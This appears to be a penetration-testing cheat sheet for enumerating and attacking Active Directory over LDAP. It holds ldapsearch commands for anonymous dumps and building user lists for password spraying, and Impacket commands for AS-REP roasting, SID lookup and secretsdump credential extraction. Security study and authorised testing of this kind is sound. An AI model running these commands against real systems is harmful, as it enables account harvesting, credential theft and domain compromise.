# LDAP Enumeration Tools

**Note:** Be careful with brute forcing AD as you can disable user accounts due to the Account Lockout Policy. 

### ldapsearch

Simple authentication check:
```
$ ldapsearch -h <target_IP> -x
```
Anonymous Credential LDAP Dumping: 
```
$ ldapsearch -LLL -x -H ldap://<domain fqdn> -b ‘’ -s base ‘(objectclass=*)’
```
Getting DN:
```
$ ldapsearch -h <target_IP> -x -s base namingcontexts
```
- `-s` is scope: one of base, one, sub or children (search scope)

If you get DN from above command, use it in a base search (-b basedn: base dn for search)
```
$ ldapsearch -h <target_IP> -x -b "DC=<blah>,DC=<blah>"
```
You can also query the LDAP server:
```
$ ldapsearch -h <target_IP> -x -b "DC=<blah>,DC=<blah>" <query>
```
i.e. user enumeration:
```
$ ldapsearch -h <target_IP> -x -b "DC=<blah>,DC=<blah>" '(objectClass=Person)'
```
This will give a lot of useful information, i.e. when password was last reset, username of the account (sAMAccountName).

Filtering your query:
```
$ ldapsearch -h <target_IP> -x -b "DC=<blah>,DC=<blah>" '(objectClass=Person)' <filters>
```
I.e. to query for only account names:
```
$ ldapsearch -h <target_IP> -x -b "DC=<blah>,DC=<blah>" '(objectClass=Person)' sAMAccountName
```
Or use grep to get a list of account names for password spraying:
```
$ ldapsearch -h <target_IP> -x -b "DC=<blah>,DC=<blah>" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap
```

### Impacket

Using that username list generated from `ldapsearch`, we can use Impacket's `GetNPUsers.py` to see if we can get a user's TGT:
```
$ python3 GetNPUsers.py -dc-ip <target_IP> -request domain.local/ -userfile userlist.ldap -format john
```
or Impacket GetADUsers.py (Must have valid credentials)
```
$ GetADUsers.py -all <domain\User> -dc-ip <DC_IP>
```

You can simply change the -format flag to hashcat if you want to use hashcat. 

Or try with no password:
```
$ python3 GetNPUsers.py <domain/user> -request -no-pass -dc-ip <IP>
```

Impacket `lookupsid.py`:
```
$ /usr/share/doc/python3-impacket/examples/lookupsid.py username:password@x.x.x.x
```

Impacket Secretdump:
```
python3 secretdump.py 'breakme.local/Administrator@172.21.0.0' -just-dc-user anakin
```

### Windapsearch

Source: https://github.com/ropnop/windapsearch 
```
$ python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U
```

#### References: 

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise)
- [Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)